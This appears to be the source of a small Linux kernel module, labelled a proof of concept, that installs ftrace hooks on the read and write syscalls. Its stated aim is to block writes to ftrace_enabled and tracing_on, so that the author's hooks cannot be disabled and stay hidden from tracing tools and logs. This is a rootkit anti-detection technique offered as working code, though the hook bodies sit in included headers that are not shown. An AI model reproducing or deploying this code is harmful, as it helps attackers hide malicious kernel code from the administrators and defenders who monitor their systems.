/* Simple POC of hooking read and write to protect our ftrace
 hooks from being disabled and exposed to tracing tools.*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

// Kernel Header Lib
#include "include/headers.h"

// Ftrace Lib for syscall tracing
#include "ftrace/ftrace.h"

// Ftrace Hooks
#include "hooks/write.h"
#include "hooks/read.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fs3cs0ciety");
MODULE_DESCRIPTION("Simple POC of hooking read and write to block writes to ftrace_enabled and tracing_on to protect our ftrace hooks from being disabled and exposed to logs/tracing tools.");

// Simple and Clean
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_write", hooked_write, &og_write),
    HOOK("__x64_sys_read", hooked_read, &og_read),
};

static int __init matheuz_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

    if (err) {
        return err;
    }

    return 0;
}

static void __exit matheuz_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(matheuz_init);
module_exit(matheuz_exit);

